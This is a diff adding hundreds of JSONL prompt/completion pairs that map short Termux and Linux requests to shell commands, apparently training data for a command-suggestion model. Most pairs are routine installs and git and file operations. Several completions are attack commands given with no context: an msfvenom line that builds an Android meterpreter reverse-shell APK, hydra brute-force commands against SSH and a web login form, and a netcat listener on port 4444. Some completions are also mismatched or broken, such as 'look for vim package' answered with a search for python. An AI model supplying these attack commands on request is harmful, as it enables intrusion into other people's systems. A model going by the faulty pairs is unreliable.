+{"prompt": "how to install fish", "completion": "pkg install fish -y"}
+{"prompt": "termux install gdb", "completion": "pkg install gdb -y"}
+{"prompt": "undo last commit keep changes", "completion": "git reset --soft HEAD~1"}
+{"prompt": "download and extract tarball", "completion": "wget https://example.com/file.tar.gz && tar -xzf file.tar.gz"}
+{"prompt": "uninstall python", "completion": "pkg uninstall python -y"}
+{"prompt": "get rust on termux", "completion": "pkg install rust -y"}
+{"prompt": "install bat", "completion": "pkg install bat -y"}
+{"prompt": "stash changes", "completion": "git stash"}
+{"prompt": "setup nmap termux", "completion": "pkg install nmap -y"}
+{"prompt": "connect on custom port", "completion": "ssh -p 2222 user@192.168.1.1"}
+{"prompt": "move file to downloads", "completion": "mv file.txt ~/storage/downloads/"}
+{"prompt": "activate virtual environment", "completion": "source env/bin/activate"}
+{"prompt": "open file manager from termux", "completion": "termux-open ."}
+{"prompt": "tmux command not found termux", "completion": "pkg install tmux -y"}
+{"prompt": "decompress bzip2", "completion": "bunzip2 file.txt.bz2"}
+{"prompt": "start ssh server", "completion": "sshd"}
+{"prompt": "stop media player", "completion": "termux-media-player stop"}
+{"prompt": "add ffmpeg package termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "need redis in termux", "completion": "pkg install redis -y"}
+{"prompt": "compile cpp file", "completion": "g++ main.cpp -o main"}
+{"prompt": "create multiple folders at once", "completion": "mkdir -p src tests docs"}
+{"prompt": "how to install python", "completion": "pkg install python -y"}
+{"prompt": "search text in file", "completion": "grep 'error' file.txt"}
+{"prompt": "stop ssh server", "completion": "pkill sshd"}
+{"prompt": "how do i install john on termux", "completion": "pkg install john -y"}
+{"prompt": "add to PATH", "completion": "export PATH=$PATH:~/bin"}
+{"prompt": "restore ubuntu", "completion": "proot-distro restore ubuntu ubuntu-backup.tar.xz"}
+{"prompt": "run background task termux", "completion": "nohup python script.py &"}
+{"prompt": "add zsh package termux", "completion": "pkg install zsh -y"}
+{"prompt": "show running servers termux", "completion": "netstat -tuln"}
+{"prompt": "i want to use ruby in termux", "completion": "pkg install ruby -y"}
+{"prompt": "can i install figlet in termux", "completion": "pkg install figlet -y"}
+{"prompt": "install rust package termux", "completion": "pkg install rust -y"}
+{"prompt": "install scrapy", "completion": "pip install scrapy"}
+{"prompt": "list contents of tar", "completion": "tar -tzf archive.tar.gz"}
+{"prompt": "ssh connection refused termux", "completion": "sshd"}
+{"prompt": "need proxychains in termux", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "clone repo gh", "completion": "gh repo clone user/repo"}
+{"prompt": "get curl on termux", "completion": "pkg install curl -y"}
+{"prompt": "get htop on termux", "completion": "pkg install htop -y"}
+{"prompt": "i want to use redis in termux", "completion": "pkg install redis -y"}
+{"prompt": "build project make", "completion": "make"}
+{"prompt": "check android version", "completion": "getprop ro.build.version.release"}
+{"prompt": "setup ruby termux", "completion": "pkg install ruby -y"}
+{"prompt": "create ssh config", "completion": "touch ~/.ssh/config && chmod 600 ~/.ssh/config"}
+{"prompt": "how to install redis", "completion": "pkg install redis -y"}
+{"prompt": "how do i install tor on termux", "completion": "pkg install tor -y"}
+{"prompt": "setup cmake termux", "completion": "pkg install cmake -y"}
+{"prompt": "list files", "completion": "ls"}
+{"prompt": "install and configure tor", "completion": "pkg install tor -y && cat > $PREFIX/etc/tor/torrc << 'EOF'\\nSocksPort 9050\\nEOF && tor &"}
+{"prompt": "split tmux pane horizontal", "completion": "tmux split-window -h"}
+{"prompt": "list hidden files", "completion": "ls -la"}
+{"prompt": "how to install wget", "completion": "pkg install wget -y"}
+{"prompt": "can i install nodejs in termux", "completion": "pkg install nodejs -y"}
+{"prompt": "add apache2 package termux", "completion": "pkg install apache2 -y"}
+{"prompt": "tag a release", "completion": "git tag v1.0.0"}
+{"prompt": "change default shell to fish", "completion": "chsh -s fish"}
+{"prompt": "install prettier", "completion": "npm install --save-dev prettier"}
+{"prompt": "how do i install screen on termux", "completion": "pkg install screen -y"}
+{"prompt": "show kernel version", "completion": "uname -a"}
+{"prompt": "run npm test", "completion": "npm test"}
+{"prompt": "create widget script", "completion": "mkdir -p ~/.shortcuts && cat > ~/.shortcuts/myscript.sh << 'EOF'\n#!/bin/bash\necho hello\nEOF\nchmod +x ~/.shortcuts/myscript.sh"}
+{"prompt": "how do i install vim on termux", "completion": "pkg install vim -y"}
+{"prompt": "install nmap in termux", "completion": "pkg install nmap -y"}
+{"prompt": "can i install bat in termux", "completion": "pkg install bat -y"}
+{"prompt": "background ssh session", "completion": "ssh -fN -L 8080:localhost:80 user@server.com"}
+{"prompt": "sqlite command not found termux", "completion": "pkg install sqlite -y"}
+{"prompt": "why is pkg not working", "completion": "pkg update -y && dpkg --configure -a"}
+{"prompt": "get wifi info", "completion": "termux-wifi-connectioninfo"}
+{"prompt": "fzf command not found termux", "completion": "pkg install fzf -y"}
+{"prompt": "remove python", "completion": "pkg uninstall python -y"}
+{"prompt": "how to install curl", "completion": "pkg install curl -y"}
+{"prompt": "get audio info", "completion": "termux-audio-info"}
+{"prompt": "add cmake package termux", "completion": "pkg install cmake -y"}
+{"prompt": "setup startup script", "completion": "mkdir -p ~/.termux/boot && cat > ~/.termux/boot/start.sh << 'EOF'\n#!/bin/bash\nsshd\nEOF\nchmod +x ~/.termux/boot/start.sh"}
+{"prompt": "how to install clang", "completion": "pkg install clang -y"}
+{"prompt": "whois lookup", "completion": "whois google.com"}
+{"prompt": "install vim plug", "completion": "curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim"}
+{"prompt": "set clipboard", "completion": "termux-clipboard-set 'hello world'"}
+{"prompt": "restore mysql database", "completion": "mysql -u root mydb < backup.sql"}
+{"prompt": "install screen", "completion": "pkg install screen -y"}
+{"prompt": "string length", "completion": "echo ${#mystring}"}
+{"prompt": "run multiple commands", "completion": "cmd1 && cmd2 && cmd3"}
+{"prompt": "bun command not found termux", "completion": "pkg install bun -y"}
+{"prompt": "show file in hex", "completion": "xxd file.bin"}
+{"prompt": "generate self signed cert", "completion": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"}
+{"prompt": "termux install golang", "completion": "pkg install golang -y"}
+{"prompt": "send notification", "completion": "termux-notification --title 'Hello' --content 'World'"}
+{"prompt": "install archlinux", "completion": "proot-distro install archlinux"}
+{"prompt": "change owner of file", "completion": "chown user:group file.txt"}
+{"prompt": "install pip", "completion": "pkg install python-pip -y"}
+{"prompt": "install tmux", "completion": "pkg install tmux -y"}
+{"prompt": "git not found termux", "completion": "pkg install git -y"}
+{"prompt": "need clang in termux", "completion": "pkg install clang -y"}
+{"prompt": "archive repo", "completion": "git archive --format=zip HEAD > repo.zip"}
+{"prompt": "check wifi ip", "completion": "ifconfig wlan0"}
+{"prompt": "base64 encode string", "completion": "echo -n 'hello' | base64"}
+{"prompt": "change file permissions", "completion": "chmod 755 script.sh"}
+{"prompt": "install make in termux", "completion": "pkg install make -y"}
+{"prompt": "termux storage permission denied", "completion": "termux-setup-storage"}
+{"prompt": "create next.js app", "completion": "npx create-next-app@latest myapp"}
+{"prompt": "print working directory", "completion": "pwd"}
+{"prompt": "install hydra", "completion": "pkg install hydra -y"}
+{"prompt": "how do i install clang on termux", "completion": "pkg install clang -y"}
+{"prompt": "install ruby in termux", "completion": "pkg install ruby -y"}
+{"prompt": "get gcc on termux", "completion": "pkg install gcc -y"}
+{"prompt": "make env variable permanent", "completion": "echo \"export MY_VAR='hello'\" >> ~/.bashrc"}
+{"prompt": "kill specific ssh session", "completion": "pkill -u username sshd"}
+{"prompt": "redirect both stdout stderr", "completion": "command > output.log 2>&1"}
+{"prompt": "termux how to get socat", "completion": "pkg install socat -y"}
+{"prompt": "install clang package termux", "completion": "pkg install clang -y"}
+{"prompt": "install ripgrep", "completion": "pkg install ripgrep -y"}
+{"prompt": "clean package cache", "completion": "pkg clean"}
+{"prompt": "create symlink", "completion": "ln -s /path/to/file link"}
+{"prompt": "ssh keepalive", "completion": "ssh -o ServerAliveInterval=60 user@host"}
+{"prompt": "figlet command not found termux", "completion": "pkg install figlet -y"}
+{"prompt": "deno command not found termux", "completion": "pkg install deno -y"}
+{"prompt": "termux how to get rust", "completion": "pkg install rust -y"}
+{"prompt": "how do i install zsh on termux", "completion": "pkg install zsh -y"}
+{"prompt": "get zsh on termux", "completion": "pkg install zsh -y"}
+{"prompt": "send process to background", "completion": "bg"}
+{"prompt": "termux how to get sqlite", "completion": "pkg install sqlite -y"}
+{"prompt": "install imagemagick", "completion": "pkg install imagemagick -y"}
+{"prompt": "install socket.io", "completion": "npm install socket.io"}
+{"prompt": "reload termux settings", "completion": "termux-reload-settings"}
+{"prompt": "show prefix path termux", "completion": "echo $PREFIX"}
+{"prompt": "delete folder myapp", "completion": "rm -rf myapp"}
+{"prompt": "install node and create package", "completion": "pkg install nodejs -y && mkdir myapp && cd myapp && npm init -y"}
+{"prompt": "delete branch", "completion": "git branch -d feature/old"}
+{"prompt": "install psycopg2", "completion": "pip install psycopg2-binary"}
+{"prompt": "setup openssh termux", "completion": "pkg install openssh -y"}
+{"prompt": "get clipboard content", "completion": "termux-clipboard-get"}
+{"prompt": "pause media player", "completion": "termux-media-player pause"}
+{"prompt": "how do i install fzf on termux", "completion": "pkg install fzf -y"}
+{"prompt": "create 7z archive", "completion": "7z a archive.7z myfolder/"}
+{"prompt": "post json with curl", "completion": "curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' https://api.example.com"}
+{"prompt": "install rust and compile hello world", "completion": "pkg install rust -y && echo 'fn main(){println!(\"Hello\");}' > main.rs && rustc main.rs && ./main"}
+{"prompt": "i want to use python in termux", "completion": "pkg install python -y"}
+{"prompt": "run node script", "completion": "node index.js"}
+{"prompt": "add mariadb package termux", "completion": "pkg install mariadb -y"}
+{"prompt": "termux install nmap", "completion": "pkg install nmap -y"}
+{"prompt": "need jq in termux", "completion": "pkg install jq -y"}
+{"prompt": "view file with bat", "completion": "bat file.txt"}
+{"prompt": "login to debian", "completion": "proot-distro login debian"}
+{"prompt": "create empty file", "completion": "touch file.txt"}
+{"prompt": "install proxychains", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "termux install ffmpeg", "completion": "pkg install ffmpeg -y"}
+{"prompt": "how do i install htop on termux", "completion": "pkg install htop -y"}
+{"prompt": "termux install redis", "completion": "pkg install redis -y"}
+{"prompt": "can i install sqlmap in termux", "completion": "pkg install sqlmap -y"}
+{"prompt": "show last 100 lines with grep", "completion": "tail -100 logfile.txt | grep 'ERROR'"}
+{"prompt": "go to music folder", "completion": "cd ~/storage/music"}
+{"prompt": "termux how to get figlet", "completion": "pkg install figlet -y"}
+{"prompt": "clean untracked files", "completion": "git clean -fd"}
+{"prompt": "install boto3", "completion": "pip install boto3"}
+{"prompt": "add nginx package termux", "completion": "pkg install nginx -y"}
+{"prompt": "install python package termux", "completion": "pkg install python -y"}
+{"prompt": "case statement", "completion": "case $var in 1) echo one;; 2) echo two;; *) echo other;; esac"}
+{"prompt": "install ffmpeg package termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "take photo", "completion": "termux-camera-photo photo.jpg"}
+{"prompt": "list cron jobs", "completion": "crontab -l"}
+{"prompt": "need rust in termux", "completion": "pkg install rust -y"}
+{"prompt": "how do i install git on termux", "completion": "pkg install git -y"}
+{"prompt": "i want to use cmake in termux", "completion": "pkg install cmake -y"}
+{"prompt": "get git on termux", "completion": "pkg install git -y"}
+{"prompt": "list available distros", "completion": "proot-distro list"}
+{"prompt": "install sysbench", "completion": "pkg install sysbench -y"}
+{"prompt": "count occurrences of word", "completion": "grep -c 'error' logfile.txt"}
+{"prompt": "how do i install socat on termux", "completion": "pkg install socat -y"}
+{"prompt": "install postgresql in termux", "completion": "pkg install postgresql -y"}
+{"prompt": "repeat command 10 times", "completion": "for i in {1..10}; do echo $i; done"}
+{"prompt": "pull with rebase", "completion": "git pull --rebase"}
+{"prompt": "can i install curl in termux", "completion": "pkg install curl -y"}
+{"prompt": "extract audio from video", "completion": "ffmpeg -i video.mp4 -q:a 0 -map a audio.mp3"}
+{"prompt": "check free space", "completion": "df -h"}
+{"prompt": "scan specific port", "completion": "nmap -p 80 192.168.1.1"}
+{"prompt": "run bash script", "completion": "bash script.sh"}
+{"prompt": "mariadb command not found termux", "completion": "pkg install mariadb -y"}
+{"prompt": "install redis python", "completion": "pip install redis"}
+{"prompt": "add openssh package termux", "completion": "pkg install openssh -y"}
+{"prompt": "termux how to get bat", "completion": "pkg install bat -y"}
+{"prompt": "install flask", "completion": "pip install flask"}
+{"prompt": "get clang on termux", "completion": "pkg install clang -y"}
+{"prompt": "install pandas", "completion": "pip install pandas"}
+{"prompt": "install mongodb", "completion": "pkg install mongodb -y"}
+{"prompt": "termux how to get curl", "completion": "pkg install curl -y"}
+{"prompt": "set git username", "completion": "git config --global user.name 'YourName'"}
+{"prompt": "install neovim", "completion": "pkg install neovim -y"}
+{"prompt": "need wget in termux", "completion": "pkg install wget -y"}
+{"prompt": "install sqlalchemy", "completion": "pip install sqlalchemy"}
+{"prompt": "publish npm package", "completion": "npm publish"}
+{"prompt": "start redis", "completion": "redis-server &"}
+{"prompt": "read pcap file", "completion": "tshark -r capture.pcap"}
+{"prompt": "cmake command not found termux", "completion": "pkg install cmake -y"}
+{"prompt": "check node version", "completion": "node --version"}
+{"prompt": "add python package termux", "completion": "pkg install python -y"}
+{"prompt": "find package termux", "completion": "pkg search python"}
+{"prompt": "show uid termux", "completion": "id"}
+{"prompt": "search text recursively", "completion": "grep -r 'TODO' ."}
+{"prompt": "install react", "completion": "npx create-react-app myapp"}
+{"prompt": "copy file to downloads", "completion": "cp file.txt ~/storage/downloads/"}
+{"prompt": "how do i install nano on termux", "completion": "pkg install nano -y"}
+{"prompt": "add git package termux", "completion": "pkg install git -y"}
+{"prompt": "get request with header", "completion": "curl -H 'Authorization: Bearer token' https://api.example.com"}
+{"prompt": "install gui ubuntu proot", "completion": "proot-distro login ubuntu -- apt install -y ubuntu-desktop"}
+{"prompt": "how to install perl", "completion": "pkg install perl -y"}
+{"prompt": "install deno", "completion": "pkg install deno -y"}
+{"prompt": "revert a commit", "completion": "git revert HEAD"}
+{"prompt": "termux how to get netcat", "completion": "pkg install netcat -y"}
+{"prompt": "can i install wget in termux", "completion": "pkg install wget -y"}
+{"prompt": "termux how to get bun", "completion": "pkg install bun -y"}
+{"prompt": "copy file a.txt to b.txt", "completion": "cp a.txt b.txt"}
+{"prompt": "build rust project", "completion": "cargo build --release"}
+{"prompt": "run kali in termux", "completion": "proot-distro install kali && proot-distro login kali"}
+{"prompt": "install sqlite in termux", "completion": "pkg install sqlite -y"}
+{"prompt": "create script make executable run", "completion": "echo '#!/bin/bash\\necho hello' > script.sh && chmod +x script.sh && ./script.sh"}
+{"prompt": "open file in neovim", "completion": "nvim file.txt"}
+{"prompt": "backup mysql database", "completion": "mysqldump -u root mydb > backup.sql"}
+{"prompt": "termux how to get htop", "completion": "pkg install htop -y"}
+{"prompt": "check ssh port termux", "completion": "cat $PREFIX/etc/ssh/sshd_config | grep Port"}
+{"prompt": "install sqlite", "completion": "pkg install sqlite -y"}
+{"prompt": "how to install nmap", "completion": "pkg install nmap -y"}
+{"prompt": "install django", "completion": "pip install django"}
+{"prompt": "make directory src", "completion": "mkdir src"}
+{"prompt": "see installed pkg", "completion": "pkg list-installed"}
+{"prompt": "termux how to get git", "completion": "pkg install git -y"}
+{"prompt": "termux how to get john", "completion": "pkg install john -y"}
+{"prompt": "need nodejs in termux", "completion": "pkg install nodejs -y"}
+{"prompt": "termux install python", "completion": "pkg install python -y"}
+{"prompt": "install socat package termux", "completion": "pkg install socat -y"}
+{"prompt": "run command in ubuntu", "completion": "proot-distro login ubuntu -- apt update"}
+{"prompt": "update termux packages", "completion": "pkg update -y"}
+{"prompt": "install docker in ubuntu proot", "completion": "proot-distro login ubuntu -- bash -c 'apt update && apt install -y docker.io'"}
+{"prompt": "setup clang termux", "completion": "pkg install clang -y"}
+{"prompt": "check ip address", "completion": "ip addr show"}
+{"prompt": "show specific env variable", "completion": "echo $HOME"}
+{"prompt": "list installed pip packages", "completion": "pip list"}
+{"prompt": "set custom termux prompt", "completion": "echo \"PS1='\\u@termux:\\w\\$ '\" >> ~/.bashrc && source ~/.bashrc"}
+{"prompt": "kill process by name", "completion": "pkill python"}
+{"prompt": "can i install tshark in termux", "completion": "pkg install tshark -y"}
+{"prompt": "vim command not found termux", "completion": "pkg install vim -y"}
+{"prompt": "install oh-my-zsh", "completion": "sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""}
+{"prompt": "set git email", "completion": "git config --global user.email 'you@example.com'"}
+{"prompt": "install pymongo", "completion": "pip install pymongo"}
+{"prompt": "add clang package termux", "completion": "pkg install clang -y"}
+{"prompt": "how to install make", "completion": "pkg install make -y"}
+{"prompt": "get nginx on termux", "completion": "pkg install nginx -y"}
+{"prompt": "go to movies folder", "completion": "cd ~/storage/movies"}
+{"prompt": "how to install gdb", "completion": "pkg install gdb -y"}
+{"prompt": "install mongoose", "completion": "npm install mongoose"}
+{"prompt": "scp file to server", "completion": "scp file.txt user@192.168.1.1:/home/user/"}
+{"prompt": "add vim package termux", "completion": "pkg install vim -y"}
+{"prompt": "need deno in termux", "completion": "pkg install deno -y"}
+{"prompt": "install desktop environment termux proot", "completion": "proot-distro login ubuntu -- apt install -y xfce4 xfce4-goodies"}
+{"prompt": "termux install tmux", "completion": "pkg install tmux -y"}
+{"prompt": "install axios", "completion": "npm install axios"}
+{"prompt": "pretty print json", "completion": "cat data.json | jq ."}
+{"prompt": "delete line containing word", "completion": "sed -i '/error/d' file.txt"}
+{"prompt": "find file named config.json", "completion": "find . -name 'config.json'"}
+{"prompt": "list npm packages", "completion": "npm list"}
+{"prompt": "brute force http form", "completion": "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:invalid'"}
+{"prompt": "termux backup", "completion": "tar -czf ~/storage/downloads/termux-backup.tar.gz $HOME"}
+{"prompt": "list jobs", "completion": "termux-job-scheduler --list"}
+{"prompt": "setup nginx termux", "completion": "pkg install nginx -y"}
+{"prompt": "termux install rust", "completion": "pkg install rust -y"}
+{"prompt": "install cryptography", "completion": "pip install cryptography"}
+{"prompt": "need python in termux", "completion": "pkg install python -y"}
+{"prompt": "setup make termux", "completion": "pkg install make -y"}
+{"prompt": "monitor file changes", "completion": "inotifywait -m /path/to/watch"}
+{"prompt": "install celery", "completion": "pip install celery"}
+{"prompt": "install requests", "completion": "pip install requests"}
+{"prompt": "python module not found", "completion": "pip install missing-module"}
+{"prompt": "termux how to get proxychains", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "parse json with jq", "completion": "cat data.json | jq '.name'"}
+{"prompt": "install figlet package termux", "completion": "pkg install figlet -y"}
+{"prompt": "download youtube playlist", "completion": "yt-dlp -f best https://youtube.com/playlist?list=PLAYLIST_ID"}
+{"prompt": "vibrate phone", "completion": "termux-vibrate -d 500"}
+{"prompt": "setup perl termux", "completion": "pkg install perl -y"}
+{"prompt": "ssh reverse tunnel", "completion": "ssh -R 9090:localhost:3000 user@server.com"}
+{"prompt": "connect mongodb", "completion": "mongosh"}
+{"prompt": "install 32 bit package termux", "completion": "echo Termux runs 64-bit — use proot-distro for 32-bit support"}
+{"prompt": "install scikit-learn", "completion": "pip install scikit-learn"}
+{"prompt": "upgrade package with pip", "completion": "pip install --upgrade requests"}
+{"prompt": "install and run jupyter", "completion": "pip install jupyterlab && jupyter lab --ip=0.0.0.0 --no-browser"}
+{"prompt": "clone specific branch", "completion": "git clone -b main https://github.com/user/repo.git"}
+{"prompt": "how to install php", "completion": "pkg install php -y"}
+{"prompt": "install tree package termux", "completion": "pkg install tree -y"}
+{"prompt": "get golang on termux", "completion": "pkg install golang -y"}
+{"prompt": "install neovim in termux", "completion": "pkg install neovim -y"}
+{"prompt": "create folder myapp", "completion": "mkdir myapp"}
+{"prompt": "echo with color red", "completion": "echo -e '\\033[31mError\\033[0m'"}
+{"prompt": "add tmux package termux", "completion": "pkg install tmux -y"}
+{"prompt": "install postgresql", "completion": "pkg install postgresql -y"}
+{"prompt": "install and start redis", "completion": "pkg install redis -y && redis-server &"}
+{"prompt": "set default editor", "completion": "export EDITOR=vim"}
+{"prompt": "i want to use apache2 in termux", "completion": "pkg install apache2 -y"}
+{"prompt": "termux install neovim", "completion": "pkg install neovim -y"}
+{"prompt": "install bat package termux", "completion": "pkg install bat -y"}
+{"prompt": "termux install make", "completion": "pkg install make -y"}
+{"prompt": "reverse dns lookup", "completion": "dig -x 8.8.8.8"}
+{"prompt": "create virtual environment", "completion": "python -m venv env"}
+{"prompt": "uninstall flask", "completion": "pip uninstall flask -y"}
+{"prompt": "kill process on port 3000", "completion": "kill $(lsof -t -i:3000)"}
+{"prompt": "setup sqlite termux", "completion": "pkg install sqlite -y"}
+{"prompt": "extract tar file", "completion": "tar -xzf archive.tar.gz"}
+{"prompt": "record audio", "completion": "termux-microphone-record -f recording.mp3"}
+{"prompt": "get battery status", "completion": "termux-battery-status"}
+{"prompt": "termux how to get ripgrep", "completion": "pkg install ripgrep -y"}
+{"prompt": "login github cli", "completion": "gh auth login"}
+{"prompt": "install clang termux", "completion": "pkg install clang -y"}
+{"prompt": "check process open files", "completion": "lsof -p 1234"}
+{"prompt": "setup git termux", "completion": "pkg install git -y"}
+{"prompt": "renice running process", "completion": "renice -n 5 -p 1234"}
+{"prompt": "create git alias", "completion": "git config --global alias.st status"}
+{"prompt": "show first 10 lines of file", "completion": "head file.txt"}
+{"prompt": "check who is logged in ssh", "completion": "who"}
+{"prompt": "i want to use zsh in termux", "completion": "pkg install zsh -y"}
+{"prompt": "install jq", "completion": "pkg install jq -y"}
+{"prompt": "build cmake project", "completion": "mkdir build && cd build && cmake .. && make"}
+{"prompt": "netcat listen port", "completion": "nc -l -p 4444"}
+{"prompt": "install hashcat", "completion": "pkg install hashcat -y"}
+{"prompt": "how do i install mariadb on termux", "completion": "pkg install mariadb -y"}
+{"prompt": "go to pictures folder", "completion": "cd ~/storage/pictures"}
+{"prompt": "create python file and run", "completion": "echo 'print(\"Hello Termux\")' > hello.py && python hello.py"}
+{"prompt": "install termux-widget", "completion": "pkg install termux-widget -y"}
+{"prompt": "install nano in termux", "completion": "pkg install nano -y"}
+{"prompt": "install pycryptodome", "completion": "pip install pycryptodome"}
+{"prompt": "how to install ffmpeg", "completion": "pkg install ffmpeg -y"}
+{"prompt": "list all available packages", "completion": "pkg list-all"}
+{"prompt": "install dotenv", "completion": "npm install dotenv"}
+{"prompt": "create function in bash", "completion": "function greet() { echo Hello $1; }"}
+{"prompt": "start mariadb", "completion": "mysqld_safe &"}
+{"prompt": "rename file old.txt to new.txt", "completion": "mv old.txt new.txt"}
+{"prompt": "reverse sort", "completion": "sort -r file.txt"}
+{"prompt": "package details", "completion": "pkg show curl"}
+{"prompt": "install aria2 package termux", "completion": "pkg install aria2 -y"}
+{"prompt": "install x11 termux", "completion": "pkg install termux-x11-nightly -y"}
+{"prompt": "install black formatter", "completion": "pip install black"}
+{"prompt": "download with aria2", "completion": "aria2c https://example.com/file.zip"}
+{"prompt": "print line numbers", "completion": "cat -n file.txt"}
+{"prompt": "can i install fzf in termux", "completion": "pkg install fzf -y"}
+{"prompt": "can i install vim in termux", "completion": "pkg install vim -y"}
+{"prompt": "permission denied termux", "completion": "chmod +x script.sh"}
+{"prompt": "install openssh", "completion": "pkg install openssh -y"}
+{"prompt": "reset ubuntu", "completion": "proot-distro reset ubuntu"}
+{"prompt": "i want to use htop in termux", "completion": "pkg install htop -y"}
+{"prompt": "how do i install aria2 on termux", "completion": "pkg install aria2 -y"}
+{"prompt": "need zsh in termux", "completion": "pkg install zsh -y"}
+{"prompt": "kill tmux session", "completion": "tmux kill-session -t 0"}
+{"prompt": "show file size", "completion": "du -sh file.txt"}
+{"prompt": "list branches", "completion": "git branch"}
+{"prompt": "setup golang termux", "completion": "pkg install golang -y"}
+{"prompt": "can i install make in termux", "completion": "pkg install make -y"}
+{"prompt": "edit bashrc", "completion": "nano ~/.bashrc"}
+{"prompt": "view file content", "completion": "cat file.txt"}
+{"prompt": "parallel jobs xargs", "completion": "ls *.py | xargs -P 4 -I{} python {}"}
+{"prompt": "update ubuntu inside proot", "completion": "proot-distro login ubuntu -- apt update && apt upgrade -y"}
+{"prompt": "netcat command not found termux", "completion": "pkg install netcat -y"}
+{"prompt": "install nodejs in termux", "completion": "pkg install nodejs -y"}
+{"prompt": "how to quit vim without saving", "completion": ":q!"}
+{"prompt": "restore termux backup", "completion": "tar -xzf ~/storage/downloads/termux-backup.tar.gz -C $HOME"}
+{"prompt": "install apache2 in termux", "completion": "pkg install apache2 -y"}
+{"prompt": "push to origin", "completion": "git push origin main"}
+{"prompt": "can i install screen in termux", "completion": "pkg install screen -y"}
+{"prompt": "benchmark cpu", "completion": "sysbench cpu --cpu-max-prime=20000 run"}
+{"prompt": "show md5 hash of file", "completion": "md5sum file.txt"}
+{"prompt": "make script executable", "completion": "chmod +x script.sh"}
+{"prompt": "need nmap in termux", "completion": "pkg install nmap -y"}
+{"prompt": "add php package termux", "completion": "pkg install php -y"}
+{"prompt": "bash not found termux", "completion": "pkg install bash -y"}
+{"prompt": "add nmap package termux", "completion": "pkg install nmap -y"}
+{"prompt": "show git log", "completion": "git log --oneline"}
+{"prompt": "start postgresql", "completion": "pg_ctl -D $PREFIX/var/lib/postgresql start"}
+{"prompt": "run regardless of error", "completion": "cmd1 ; cmd2 ; cmd3"}
+{"prompt": "show file type", "completion": "file myfile"}
+{"prompt": "clone a repo", "completion": "git clone https://github.com/user/repo.git"}
+{"prompt": "show diff", "completion": "git diff"}
+{"prompt": "link library when compiling", "completion": "gcc main.c -lm -o main"}
+{"prompt": "show path variable", "completion": "echo $PATH"}
+{"prompt": "download file with curl", "completion": "curl -O https://example.com/file.zip"}
+{"prompt": "setup curl termux", "completion": "pkg install curl -y"}
+{"prompt": "termux how to get neovim", "completion": "pkg install neovim -y"}
+{"prompt": "install beautifulsoup", "completion": "pip install beautifulsoup4"}
+{"prompt": "can i install php in termux", "completion": "pkg install php -y"}
+{"prompt": "check if directory exists", "completion": "[ -d mydir ] && echo exists || echo missing"}
+{"prompt": "sync packages", "completion": "pkg update -y"}
+{"prompt": "termux how to get redis", "completion": "pkg install redis -y"}
+{"prompt": "install ubuntu", "completion": "proot-distro install ubuntu"}
+{"prompt": "install ruby package termux", "completion": "pkg install ruby -y"}
+{"prompt": "compile with optimizations", "completion": "gcc -O2 main.c -o main"}
+{"prompt": "termux how to get fzf", "completion": "pkg install fzf -y"}
+{"prompt": "redirect stderr", "completion": "command 2> error.log"}
+{"prompt": "install rust in termux", "completion": "pkg install rust -y"}
+{"prompt": "how do i install python on termux", "completion": "pkg install python -y"}
+{"prompt": "install aiohttp", "completion": "pip install aiohttp"}
+{"prompt": "capture traffic", "completion": "tshark -i wlan0 -w capture.pcap"}
+{"prompt": "check ssl certificate", "completion": "echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates"}
+{"prompt": "install mariadb package termux", "completion": "pkg install mariadb -y"}
+{"prompt": "audit npm packages", "completion": "npm audit"}
+{"prompt": "check if ssh is running", "completion": "pgrep sshd && echo running || echo stopped"}
+{"prompt": "brute force ssh", "completion": "hydra -l admin -P wordlist.txt ssh://192.168.1.1"}
+{"prompt": "how do i install aircrack-ng on termux", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "service version scan", "completion": "nmap -sV 192.168.1.1"}
+{"prompt": "look for vim package", "completion": "pkg search python"}
+{"prompt": "can i install nikto in termux", "completion": "pkg install nikto -y"}
+{"prompt": "can i install tmux in termux", "completion": "pkg install tmux -y"}
+{"prompt": "zsh command not found termux", "completion": "pkg install zsh -y"}
+{"prompt": "generate reverse shell", "completion": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 R > payload.apk"}
+{"prompt": "install eslint", "completion": "npm install --save-dev eslint"}
+{"prompt": "can i install tor in termux", "completion": "pkg install tor -y"}
+{"prompt": "can i install git in termux", "completion": "pkg install git -y"}
+{"prompt": "can i install ffmpeg in termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "create mysql database", "completion": "mysql -u root -e 'CREATE DATABASE mydb;'"}
+{"prompt": "scp file from server", "completion": "scp user@192.168.1.1:/remote/file.txt ."}
+{"prompt": "install exa", "completion": "pkg install exa -y"}
+{"prompt": "get media info", "completion": "termux-media-player info"}
+{"prompt": "how to install vim", "completion": "pkg install vim -y"}
+{"prompt": "can i install sqlite in termux", "completion": "pkg install sqlite -y"}
+{"prompt": "can i install redis in termux", "completion": "pkg install redis -y"}
+{"prompt": "get vim on termux", "completion": "pkg install vim -y"}
+{"prompt": "run if first fails", "completion": "cmd1 || cmd2"}
+{"prompt": "wget command not found termux", "completion": "pkg install wget -y"}
+{"prompt": "test port open", "completion": "nc -zv 192.168.1.1 80"}
+{"prompt": "view ssh public key", "completion": "cat ~/.ssh/id_rsa.pub"}
+{"prompt": "how to install zsh", "completion": "pkg install zsh -y"}
+{"prompt": "awk filter rows", "completion": "awk '$2 > 100' file.txt"}
+{"prompt": "merge files", "completion": "cat file1.txt file2.txt > merged.txt"}
+{"prompt": "pipe two commands", "completion": "cat file.txt | grep error"}
+{"prompt": "setup nano termux", "completion": "pkg install nano -y"}
+{"prompt": "fix broken git", "completion": "pkg reinstall git -y"}
+{"prompt": "add lua package termux", "completion": "pkg install lua -y"}
+{"prompt": "awk print column", "completion": "awk '{print $1}' file.txt"}
